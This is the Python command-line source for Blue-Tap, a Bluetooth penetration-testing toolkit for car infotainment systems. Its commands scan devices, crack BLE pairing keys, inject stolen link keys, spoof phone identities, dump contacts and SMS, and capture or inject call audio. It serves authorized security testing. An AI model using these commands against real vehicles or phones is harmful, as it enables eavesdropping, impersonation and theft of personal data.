"""Blue-Tap CLI - Bluetooth/BLE Penetration Testing Toolkit for Automotive IVI."""

import json
import os
import re
import time

import click
from rich.table import Table
from rich.panel import Panel

from blue_tap import __version__
from blue_tap.utils.output import (
    banner, info, success, error, warning, verbose, device_table, service_table, channel_table,
    console, summary_panel,
)
from blue_tap.utils.interactive import resolve_address, pick_two_devices


_SESSION_SKIP_COMMANDS = {"blue-tap", "blue-tap run"}


def _normalize_command_path(ctx: click.Context) -> str:
    """Normalize Click command path into blue-tap subcommand form."""
    parts = ctx.command_path.split()
    if "blue-tap" in parts:
        return " ".join(parts[parts.index("blue-tap"):])

    # Fallback when invoked as `python -m blue_tap.cli ...`
    names = []
    node = ctx
    while node is not None:
        cmd = getattr(node, "command", None)
        name = getattr(cmd, "name", "")
        if name and name != "main":
            names.append(name)
        node = node.parent
    names.reverse()
    if not names:
        return "blue-tap"
    return f"blue-tap {' '.join(names)}"


def _extract_target_param(params: dict) -> str:
    """Best-effort target extraction for session metadata."""
    candidate_keys = (
        "address", "ivi_address", "phone_address", "target", "target_mac",
        "ivi_mac", "mac", "remote_mac",
    )
    for key in candidate_keys:
        value = params.get(key, "")
        if isinstance(value, str) and value:
            return value
    return ""


def _infer_category(command_path: str) -> str:
    """Infer a report category from click command path."""
    parts = command_path.split()
    if len(parts) < 2:
        return "general"
    root = parts[1]
    if root == "scan":
        return "scan"
    if root == "recon":
        return "recon"
    if root in {"pbap", "map", "at", "opp"}:
        return "data"
    if root in {"hfp", "audio"}:
        return "audio"
    if root == "vulnscan":
        return "vuln"
    if root == "fuzz":
        return "fuzz"
    if root == "dos":
        return "dos"
    if root in {"hijack", "auto", "bias", "avrcp", "spoof"}:
        return "attack"
    return "general"


class LoggedCommand(click.Command):
    """Click command with automatic session logging for every invocation."""

    def invoke(self, ctx):
        from blue_tap.utils.session import log_command

        status = "success"
        err = ""
        started = time.time()
        command_path = _normalize_command_path(ctx)
        try:
            return super().invoke(ctx)
        except KeyboardInterrupt:
            status = "interrupted"
            raise
        except Exception as exc:
            status = "error"
            err = str(exc)
            raise
        finally:
            if command_path in _SESSION_SKIP_COMMANDS:
                return
            payload = {
                "command_path": command_path,
                "status": status,
                "duration_s": round(time.time() - started, 3),
                "params": dict(ctx.params),
            }
            if err:
                payload["error"] = err
            log_command(
                command=command_path.replace(" ", "_"),
                data=payload,
                category=_infer_category(command_path),
                target=_extract_target_param(ctx.params),
            )


class LoggedGroup(click.Group):
    """Click group that propagates logged command/group classes."""

    command_class = LoggedCommand
    group_class = None


LoggedGroup.group_class = LoggedGroup


@click.group(cls=LoggedGroup)
@click.version_option(version=__version__)
@click.option("-v", "--verbose", count=True, help="Verbosity: -v verbose, -vv debug")
@click.option("-s", "--session", "session_name", default=None,
              help="Session name (default: auto-generated from date/time). "
                   "Use to resume a previous session.")
def main(verbose, session_name):
    """Blue-Tap: Bluetooth/BLE Penetration Testing Toolkit for Automotive IVI.

    \b
    Quick start:
      blue-tap adapter list                        # check adapters
      blue-tap scan classic                        # discover devices
      blue-tap vulnscan AA:BB:CC:DD:EE:FF          # vulnerability scan
      blue-tap hijack IVI_MAC PHONE_MAC            # full attack chain

    \b
    Sessions (automatic — all output is always saved):
      blue-tap scan classic                        # auto-session created
      blue-tap -s mytest scan classic              # named session
      blue-tap -s mytest vulnscan TARGET           # resume named session
      blue-tap session list                        # see all sessions
      blue-tap report                              # report from latest session
    """
    import sys
    from blue_tap.utils.output import set_verbosity
    set_verbosity(verbose)

    # Skip session creation when user is just asking for help
    if '--help' in sys.argv or '-h' in sys.argv:
        return

    # Always create a session — auto-generate name if not provided
    from blue_tap.utils.session import Session, set_session
    from datetime import datetime
    if not session_name:
        session_name = datetime.now().strftime("blue-tap_%Y%m%d_%H%M%S")
    session = Session(session_name)
    set_session(session)
    info(f"Session: [bold]{session_name}[/bold] -> {session.dir}")


# ============================================================================
# ADAPTER MANAGEMENT
# ============================================================================
@main.group()
def adapter():
    """HCI Bluetooth adapter management."""


@adapter.command("list")
def adapter_list():
    """List available Bluetooth adapters with chipset and capability info."""
    from blue_tap.core.adapter import list_adapters, recommend_adapter_roles

    adapters = list_adapters()
    if not adapters:
        return

    from rich.style import Style as _S
    table = Table(title="[bold #00d4ff]HCI Adapters[/bold #00d4ff]", show_lines=True, border_style="#666666", header_style=_S(bold=True, color="#00d4ff"))
    table.add_column("Name", style="#00d4ff")
    table.add_column("Address", style="#bf5af2")
    table.add_column("Chipset", style="#ffaa00")
    table.add_column("BT Ver", style="#4488ff")
    table.add_column("Features", style="dim")
    table.add_column("Spoof?", style="bold")
    table.add_column("Status", style="bold")

    for a in adapters:
        status_style = "green" if a["status"] == "UP" else "red"
        chipset = a.get("chipset", a.get("type", ""))
        bt_ver = a.get("bt_version", "")
        features = ", ".join(a.get("features", [])[:5])
        can_spoof = a.get("capabilities", {}).get("address_change")
        spoof_str = {True: "[green]Yes[/green]", False: "[red]No[/red]", None: "[yellow]?[/yellow]"}[can_spoof]
        table.add_row(a["name"], a["address"], chipset, bt_ver, features, spoof_str,
                       f"[{status_style}]{a['status']}[/{status_style}]")

    console.print(table)

    # Show adapter role recommendations if multiple adapters
    if len(adapters) >= 1:
        rec = recommend_adapter_roles(adapters)
        for note in rec.get("notes", []):
            info(note)


@adapter.command("info")
@click.argument("hci", default="hci0")
def adapter_info(hci):
    """Show detailed adapter info: chipset, features, capabilities."""
    from blue_tap.core.adapter import get_adapter_info, _adapter_exists
    if not _adapter_exists(hci):
        return
    ext = get_adapter_info(hci)

    panel_data = {
        "Chipset": ext.get("chipset", "Unknown"),
        "Manufacturer": ext.get("manufacturer", "Unknown"),
        "BT Version": ext.get("bt_version", "Unknown"),
        "Features": ", ".join(ext.get("features", [])) or "None detected",
        "BR/EDR": str(ext["capabilities"]["bredr"]),
        "LE": str(ext["capabilities"]["le"]),
        "Dual-Mode": str(ext["capabilities"]["dual_mode"]),
        "SSP": str(ext["capabilities"]["ssp"]),
        "Secure Connections": str(ext["capabilities"]["sc"]),
        "MAC Spoofing": {True: "Supported", False: "NOT supported", None: "Unknown"}[ext["capabilities"]["address_change"]],
    }
    summary_panel(f"Adapter {hci} Details", panel_data)


@adapter.command()
@click.argument("hci", default="hci0")
def up(hci):
    """Bring adapter up."""
    from blue_tap.core.adapter import adapter_up
    adapter_up(hci)


@adapter.command()
@click.argument("hci", default="hci0")
def down(hci):
    """Bring adapter down."""
    from blue_tap.core.adapter import adapter_down
    adapter_down(hci)


@adapter.command()
@click.argument("hci", default="hci0")
def reset(hci):
    """Reset adapter."""
    from blue_tap.core.adapter import adapter_reset
    adapter_reset(hci)


@adapter.command("set-name")
@click.argument("hci")
@click.argument("name")
def set_name(hci, name):
    """Set adapter Bluetooth name (for impersonation)."""
    from blue_tap.core.adapter import set_device_name
    set_device_name(hci, name)


@adapter.command("set-class")
@click.argument("hci")
@click.argument("device_class", default="0x5a020c")
def set_class(hci, device_class):
    """Set device class. Default 0x5a020c = smartphone."""
    from blue_tap.core.adapter import set_device_class
    set_device_class(hci, device_class)


# ============================================================================
# SCANNING
# ============================================================================
@main.group()
def scan():
    """Discover Bluetooth Classic and BLE devices."""


@scan.command("classic")
@click.option("-d", "--duration", default=10, help="Scan duration in seconds")
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def scan_classic(duration, hci, output):
    """Scan for Bluetooth Classic devices."""
    from blue_tap.core.scanner import scan_classic as _scan
    from blue_tap.utils.session import log_command

    devices = _scan(duration, hci)
    verbose(f"hcitool scan completed, parsing {len(devices)} results")
    if devices:
        console.print(device_table(devices, "Classic BT Devices"))
        log_command("scan_classic", devices, category="scan")
    if output:
        _save_json(devices, output)


@scan.command("ble")
@click.option("-d", "--duration", default=10, help="Scan duration in seconds")
@click.option("-p", "--passive", is_flag=True, help="Passive scan (no SCAN_REQ, stealthier)")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def scan_ble(duration, passive, output):
    """Scan for BLE devices. Use --passive for stealth mode."""
    from blue_tap.core.scanner import scan_ble_sync
    from blue_tap.utils.session import log_command

    devices = scan_ble_sync(duration, passive=passive)
    if devices:
        console.print(device_table(devices, "BLE Devices"))
        log_command("scan_ble", devices, category="scan")
    if output:
        _save_json(devices, output)


@scan.command("all")
@click.option("-d", "--duration", default=10, help="Scan duration in seconds")
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def scan_all(duration, hci, output):
    """Scan both Classic BT and BLE simultaneously."""
    from blue_tap.core.scanner import scan_all as _scan_all
    from blue_tap.utils.session import log_command

    devices = _scan_all(duration, hci)
    if devices:
        console.print(device_table(devices, "All Bluetooth Devices"))
        log_command("scan_all", devices, category="scan")
    if output:
        _save_json(devices, output)


# ============================================================================
# RECONNAISSANCE
# ============================================================================
@main.group()
def recon():
    """Service enumeration and device fingerprinting."""


@recon.command("sdp")
@click.argument("address", required=False, default=None)
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_sdp(address, output):
    """Browse SDP services on a target device."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.sdp import browse_services

    services = browse_services(address)
    if services:
        console.print(service_table(services, f"SDP Services: {address}"))

        # Show raw details
        for svc in services:
            profile = svc.get("profile", "")
            if any(kw in profile for kw in ["PBAP", "MAP", "HFP", "A2DP", "SPP"]):
                success(f"  INTERESTING: {svc.get('name')} -> {profile} "
                        f"(ch={svc.get('channel')})")

    from blue_tap.utils.session import log_command
    log_command("sdp_browse", services, category="recon", target=address)

    if output:
        _save_json(services, output)


@recon.command("gatt")
@click.argument("address", required=False, default=None)
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_gatt(address, output):
    """Enumerate BLE GATT services and characteristics."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.gatt import enumerate_services_sync

    services = enumerate_services_sync(address)
    for svc in services:
        console.print(f"\n[bold cyan]Service: {svc['description']}[/bold cyan]")
        console.print(f"  UUID: {svc['uuid']}  Handle: {svc['handle']}")
        for char in svc["characteristics"]:
            props = ", ".join(char["properties"])
            console.print(f"  [green]{char['description']}[/green] [{props}]")
            console.print(f"    UUID: {char['uuid']}")
            if char.get("value_hex"):
                console.print(f"    Value: {char['value_hex']} | {char.get('value_str', '')}")

    if output:
        _save_json(services, output)


@recon.command("fingerprint")
@click.argument("address", required=False, default=None)
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_fingerprint(address, output):
    """Fingerprint a device and identify IVI characteristics."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.fingerprint import fingerprint_device

    fp = fingerprint_device(address)

    class_info = fp.get("device_class_info", {})
    class_str = ""
    if class_info:
        class_str = f"{class_info.get('major', '?')}/{class_info.get('minor', '?')}"
        if class_info.get("services"):
            class_str += f" [{', '.join(class_info['services'])}]"

    ivi_str = "[green]LIKELY[/green]" if fp.get("ivi_likely") else "[dim]Unknown[/dim]"
    panel_text = f"""[cyan]Address:[/cyan] {fp['address']}
[cyan]Name:[/cyan] {fp['name']}
[cyan]Chipset:[/cyan] {fp['manufacturer']}
[cyan]IVI Likely:[/cyan] {ivi_str}
[cyan]Device Class:[/cyan] {fp.get('device_class', 'N/A')} {class_str}
[cyan]BT Version:[/cyan] {fp.get('lmp_version') or fp.get('bt_version') or 'N/A'}
[cyan]Profiles:[/cyan] {len(fp['profiles'])}"""

    console.print(Panel(panel_text, title="Device Fingerprint", border_style="cyan"))

    if fp.get("ivi_signals"):
        console.print("\n[bold cyan]IVI Signals (heuristic):[/bold cyan]")
        for sig in fp["ivi_signals"]:
            console.print(f"  [cyan]~[/cyan] {sig}")

    if fp["attack_surface"]:
        console.print("\n[bold red]Attack Surface:[/bold red]")
        for surface in fp["attack_surface"]:
            console.print(f"  [red]>[/red] {surface}")

    if fp.get("vuln_hints"):
        console.print("\n[bold yellow]Vulnerability Indicators:[/bold yellow]")
        for hint in fp["vuln_hints"]:
            console.print(f"  [yellow]![/yellow] {hint}")

    from blue_tap.utils.session import log_command
    log_command("fingerprint", fp, category="recon", target=address)

    if output:
        _save_json(fp, output)


@recon.command("ssp")
@click.argument("address", required=False, default=None)
def recon_ssp(address):
    """Check if device supports Secure Simple Pairing."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.sdp import check_ssp

    result = check_ssp(address)
    if result is True:
        success(f"{address} supports SSP (more secure pairing)")
    elif result is False:
        warning(f"{address} may NOT support SSP (legacy pairing - easier to attack)")
    else:
        error(f"Could not determine SSP support for {address}")


@recon.command("rfcomm-scan")
@click.argument("address", required=False, default=None)
@click.option("-t", "--timeout", default=2.0, help="Timeout per channel")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_rfcomm_scan(address, timeout, output):
    """Scan all RFCOMM channels (1-30) for hidden services."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.rfcomm_scan import RFCOMMScanner

    scanner = RFCOMMScanner(address)
    results = scanner.scan_all_channels(timeout_per_ch=timeout)

    # Show open/interesting channels only
    interesting = [r for r in results if r["status"] != "closed"]
    if interesting:
        console.print(channel_table(interesting, title="RFCOMM Scan Results"))
    else:
        warning("No open RFCOMM channels found")

    open_channels = [r for r in results if r["status"] == "open"]
    info(f"Scanned 30 channels: {len(open_channels)} open")

    if output:
        # Serialize (strip raw_response bytes for JSON)
        for r in results:
            r.pop("raw_response", None)
        _save_json(results, output)


@recon.command("l2cap-scan")
@click.argument("address", required=False, default=None)
@click.option("--dynamic", is_flag=True, help="Also scan dynamic PSM range")
@click.option("-t", "--timeout", default=1.0, help="Timeout per PSM")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_l2cap_scan(address, dynamic, timeout, output):
    """Scan L2CAP PSM values for open services."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.l2cap_scan import L2CAPScanner

    scanner = L2CAPScanner(address)
    results = scanner.scan_standard_psms(timeout=timeout)

    if dynamic:
        results.extend(scanner.scan_dynamic_psms(timeout=timeout))

    if results:
        console.print(channel_table(results, title="L2CAP Scan Results"))

    open_psms = [r for r in results if r["status"] in ("open", "auth_required")]
    if not open_psms:
        warning("No open L2CAP PSMs found")

    if output:
        _save_json(results, output)


@recon.command("capture-start")
@click.option("-o", "--output", default="bt_capture.log", help="Output file")
@click.option("-i", "--hci", default=None, help="HCI adapter (default: all)")
@click.option("--pcap", is_flag=True, help="Write btsnoop/pcap format for Wireshark")
def recon_capture_start(output, hci, pcap):
    """Start HCI traffic capture via btmon."""
    from blue_tap.recon.hci_capture import HCICapture

    # Auto-adjust extension for pcap mode
    if pcap and not output.endswith((".pcap", ".btsnoop")):
        output = output.rsplit(".", 1)[0] + ".btsnoop"

    cap = HCICapture()
    if cap.start(output, hci=hci, pcap=pcap):
        success(f"btmon capture started -> {output}")
    else:
        error("Failed to start capture")


@recon.command("capture-stop")
def recon_capture_stop():
    """Stop HCI traffic capture."""
    from blue_tap.recon.hci_capture import HCICapture

    cap = HCICapture()
    result = cap.stop()
    if result:
        success(f"Capture stopped: {result}")
    else:
        warning("No capture appears to be running")


@recon.command("pairing-mode")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
def recon_pairing_mode(address, hci):
    """Detect target's pairing mode and IO capabilities."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.hci_capture import detect_pairing_mode

    result = detect_pairing_mode(address, hci)
    panel_text = (
        f"[cyan]SSP Supported:[/cyan] {result.get('ssp_supported') if result.get('ssp_supported') is not None else 'Inconclusive (probe failed)'}\n"
        f"[cyan]IO Capability:[/cyan] {result.get('io_capability', 'Unknown')}\n"
        f"[cyan]Pairing Method:[/cyan] {result.get('pairing_method', 'Unknown')}"
    )
    console.print(Panel(panel_text, title="Pairing Mode Detection", border_style="cyan"))


@recon.command("nrf-scan")
@click.option("-d", "--duration", default=30, help="Scan duration (seconds)")
def recon_nrf_scan(duration):
    """Scan BLE advertisers using nRF52840 dongle."""
    from blue_tap.recon.sniffer import NRFBLESniffer

    sniffer = NRFBLESniffer()
    sniffer.scan_advertisers(duration)


@recon.command("usrp-scan")
@click.option("-d", "--duration", default=30, help="Scan duration (seconds)")
def recon_usrp_scan(duration):
    """Scan for BR/EDR piconets using USRP B210."""
    from blue_tap.recon.sniffer import USRPCapture

    cap = USRPCapture()
    cap.scan_piconets(duration)


@recon.command("nrf-sniff")
@click.option("-t", "--target", default=None, help="BLE address to follow")
@click.option("-o", "--output", default="ble_pairing.pcap", help="Output pcap file")
@click.option("-d", "--duration", default=120, help="Capture duration (seconds)")
def recon_nrf_sniff(target, output, duration):
    """Sniff BLE pairing exchanges using nRF52840 dongle."""
    from blue_tap.recon.sniffer import NRFBLESniffer

    sniffer = NRFBLESniffer()
    sniffer.sniff_pairing(output, duration, target=target)


@recon.command("usrp-follow")
@click.argument("address", required=False, default=None)
@click.option("-o", "--output", default="bt_capture.pcap", help="Output pcap file")
@click.option("-d", "--duration", default=120, help="Capture duration (seconds)")
def recon_usrp_follow(address, output, duration):
    """Follow a BR/EDR piconet and capture traffic using USRP B210."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.sniffer import USRPCapture

    cap = USRPCapture()
    cap.follow_piconet(address, output, duration)


@recon.command("usrp-capture")
@click.option("-o", "--output", default="raw_capture.iq", help="Output IQ file")
@click.option("-d", "--duration", default=60, help="Capture duration (seconds)")
@click.option("--freq", default=2441000000, help="Center frequency (Hz)")
@click.option("--rate", default=4000000, help="Sample rate (Hz)")
def recon_usrp_capture(output, duration, freq, rate):
    """Raw IQ capture with USRP B210."""
    from blue_tap.recon.sniffer import USRPCapture

    cap = USRPCapture()
    cap.capture_raw_iq(output, duration, freq, rate)


@recon.command("crack-key")
@click.argument("pcap_file")
@click.option("-o", "--output", default=None, help="Output decrypted pcap")
def recon_crack_key(pcap_file, output):
    """Crack BLE pairing key from captured pcap using Crackle."""
    from blue_tap.recon.sniffer import CrackleRunner

    runner = CrackleRunner()
    result = runner.crack_ble(pcap_file, output)
    if result.get("success"):
        if result.get("ltk"):
            success(f"LTK: {result['ltk']}")
        if result.get("tk"):
            info(f"TK: {result['tk']}")


@recon.command("extract-link-key")
@click.argument("pcap_file")
def recon_extract_link_key(pcap_file):
    """Extract BR/EDR link key from captured pairing pcap (via tshark)."""
    from blue_tap.recon.sniffer import LinkKeyExtractor

    extractor = LinkKeyExtractor()
    result = extractor.extract_from_pcap(pcap_file)
    if result.get("success"):
        for key in result.get("keys", []):
            success(f"Link key: {key}")


@recon.command("inject-link-key")
@click.argument("remote_mac")
@click.argument("link_key")
@click.option("-i", "--hci", default="hci0")
@click.option("--key-type", default=4, help="BlueZ key type (4=auth, 5=unauth)")
def recon_inject_link_key(remote_mac, link_key, hci, key_type):
    """Inject a recovered link key into BlueZ for impersonation.

    \b
    After recovering a link key (via nRF/USRP capture + crack, or other means),
    inject it so bluetoothctl can connect using the stolen key.
    """
    from blue_tap.recon.sniffer import LinkKeyExtractor

    extractor = LinkKeyExtractor()
    adapter_mac = extractor.get_adapter_mac(hci)
    if not adapter_mac:
        error(f"Cannot determine adapter MAC for {hci}")
        return
    extractor.inject_link_key(adapter_mac, remote_mac, link_key, key_type)


# ============================================================================
# SPOOFING
# ============================================================================
@main.group()
def spoof():
    """MAC address spoofing and device impersonation."""


@spoof.command("mac")
@click.argument("target_mac", required=False, default=None)
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("-m", "--method", default="auto",
              type=click.Choice(["auto", "bdaddr", "spooftooph", "btmgmt"]))
def spoof_mac(target_mac, hci, method):
    """Spoof adapter MAC address to target."""
    target_mac = resolve_address(target_mac)
    if not target_mac:
        return
    from blue_tap.core.spoofer import spoof_address
    spoof_address(hci, target_mac, method)


@spoof.command("clone")
@click.argument("target_mac", required=False, default=None)
@click.argument("target_name", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
@click.option("-c", "--device-class", default="0x5a020c",
              help="Device class (default: smartphone)")
def spoof_clone(target_mac, target_name, hci, device_class):
    """Full identity clone: MAC + name + device class."""
    target_mac = resolve_address(target_mac)
    if not target_mac:
        return
    if not target_name:
        error("Phone name is required for identity clone (e.g., 'Galaxy S24')")
        return
    from blue_tap.core.spoofer import clone_device_identity
    clone_device_identity(hci, target_mac, target_name, device_class)


@spoof.command("restore")
@click.option("-i", "--hci", default="hci0")
@click.option("-m", "--method", default="auto",
              type=click.Choice(["auto", "bdaddr", "spooftooph", "btmgmt"]))
def spoof_restore(hci, method):
    """Restore adapter to its original MAC address."""
    from blue_tap.core.spoofer import restore_original_mac
    restore_original_mac(hci, method)


# ============================================================================
# PBAP - Phone Book Access
# ============================================================================
@main.group()
def pbap():
    """Phone Book Access Profile - download phonebook and call logs."""


@pbap.command("pull")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None,
              help="RFCOMM channel (auto-discovered if not specified)")
@click.option("-p", "--path", default="telecom/pb.vcf",
              help="PBAP path to pull")
@click.option("-o", "--output-dir", default="pbap_dump")
def pbap_pull(address, channel, path, output_dir):
    """Pull a specific phonebook object."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.pbap import PBAPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Phonebook")
        if channel is None:
            channel = find_service_channel(address, "PBAP")
        if channel is None:
            error("Could not find PBAP channel. Specify with -c.")
            return

    client = PBAPClient(address, channel=channel)
    if not client.connect():
        return

    try:
        data = client.pull_phonebook(path)
        if data:
            os.makedirs(output_dir, exist_ok=True)
            filename = os.path.join(output_dir, path.replace("/", "_"))
            with open(filename, "w") as f:
                f.write(data)
            success(f"Saved to {filename}")
            console.print(data[:2000])  # Preview
    finally:
        client.disconnect()


@pbap.command("dump")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-o", "--output-dir", default="pbap_dump")
def pbap_dump(address, channel, output_dir):
    """Dump ALL phonebook data: contacts, call logs, favorites, SIM."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.pbap import PBAPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Phonebook")
        if channel is None:
            channel = find_service_channel(address, "PBAP")
        if channel is None:
            error("Could not find PBAP channel. Specify with -c.")
            return

    client = PBAPClient(address, channel=channel)
    if not client.connect():
        return

    try:
        results = client.pull_all_data(output_dir)
        if results:
            table = Table(title="PBAP Dump Results")
            table.add_column("Path")
            table.add_column("Description")
            table.add_column("File")
            table.add_column("Size", justify="right")
            for path, info_dict in results.items():
                table.add_row(path, info_dict["description"],
                              info_dict["file"], str(info_dict["size"]))
            console.print(table)
    finally:
        client.disconnect()


# ============================================================================
# MAP - Message Access
# ============================================================================
@main.group("map")
def map_cmd():
    """Message Access Profile - download SMS/MMS messages."""


@map_cmd.command("list")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-f", "--folder", default="telecom/msg/inbox")
def map_list(address, channel, folder):
    """List messages in a folder."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.map_client import MAPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Message")
        if channel is None:
            channel = find_service_channel(address, "MAP")
        if channel is None:
            error("Could not find MAP channel. Specify with -c.")
            return

    client = MAPClient(address, channel=channel)
    if not client.connect():
        return

    try:
        listing = client.get_messages_listing(folder)
        if listing:
            console.print(listing)
    finally:
        client.disconnect()


@map_cmd.command("dump")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-o", "--output-dir", default="map_dump")
def map_dump(address, channel, output_dir):
    """Dump all messages from all folders."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.map_client import MAPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Message")
        if channel is None:
            channel = find_service_channel(address, "MAP")
        if channel is None:
            error("Could not find MAP channel. Specify with -c.")
            return

    client = MAPClient(address, channel=channel)
    if not client.connect():
        return

    try:
        client.dump_all_messages(output_dir)
    finally:
        client.disconnect()


# ============================================================================
# HFP - Hands-Free Profile (Audio)
# ============================================================================
@main.group()
def hfp():
    """Hands-Free Profile - call audio interception and injection."""


@hfp.command("connect")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
def hfp_connect(address, channel):
    """Connect HFP and establish Service Level Connection."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")

    if channel is None:
        error("Could not find HFP channel. Specify with -c.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        success("HFP SLC ready. Use other hfp commands for audio operations.")
        # Interactive AT command mode
        info("Entering AT command mode. Type 'quit' to exit.")
        while True:
            try:
                cmd = input("AT> ").strip()
                if cmd.lower() in ("quit", "exit", "q"):
                    break
                if cmd:
                    client.send_at(cmd)
            except (EOFError, KeyboardInterrupt):
                break
        client.disconnect()


@hfp.command("capture")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
@click.option("-o", "--output", default="hfp_capture.wav")
@click.option("-d", "--duration", default=60, help="Capture duration in seconds")
def hfp_capture(address, channel, output, duration):
    """Capture call audio to WAV file via SCO link."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")

    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        client.capture_audio(output, duration)
        client.disconnect()


@hfp.command("inject")
@click.argument("address", required=False, default=None)
@click.argument("audio_file")
@click.option("-c", "--channel", type=int, default=None)
def hfp_inject(address, audio_file, channel):
    """Inject audio file into call via SCO link."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")

    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        client.inject_audio(audio_file)
        client.disconnect()


@hfp.command("at")
@click.argument("address", required=False, default=None)
@click.argument("command")
@click.option("-c", "--channel", type=int, default=None)
def hfp_at(address, command, channel):
    """Send a raw AT command to the HFP Audio Gateway."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")

    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect():
        client.setup_slc()
        result = client.send_at(command)
        console.print(f"[yellow]{result}[/yellow]")
        client.disconnect()


@hfp.command("dtmf")
@click.argument("address", required=False, default=None)
@click.argument("digits")
@click.option("-c", "--channel", type=int, default=None)
@click.option("--interval", default=0.3, help="Delay between digits (seconds)")
def hfp_dtmf(address, digits, channel, interval):
    """Send DTMF tones (e.g., '1234#')."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        client.dtmf_sequence(digits, interval)
        client.disconnect()


@hfp.command("hold")
@click.argument("address", required=False, default=None)
@click.argument("action", type=int)
@click.option("-c", "--channel", type=int, default=None)
def hfp_hold(address, action, channel):
    """Call hold/swap (0=release, 1=hold+accept, 2=swap, 3=conference)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        result = client.call_hold(action)
        console.print(f"[yellow]{result}[/yellow]")
        client.disconnect()


@hfp.command("redial")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=None)
def hfp_redial(address, channel):
    """Redial the last dialed number."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        result = client.redial()
        console.print(f"[yellow]{result}[/yellow]")
        client.disconnect()


@hfp.command("voice")
@click.argument("address", required=False, default=None)
@click.option("--on/--off", default=True, help="Enable or disable voice recognition")
@click.option("-c", "--channel", type=int, default=None)
def hfp_voice(address, on, channel):
    """Activate/deactivate voice recognition on the IVI."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.hfp import HFPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Hands-Free")
        if channel is None:
            channel = find_service_channel(address, "HFP")
    if channel is None:
        error("Could not find HFP channel.")
        return

    client = HFPClient(address, channel=channel)
    if client.connect() and client.setup_slc():
        result = client.voice_recognition(on)
        console.print(f"[yellow]{result}[/yellow]")
        client.disconnect()


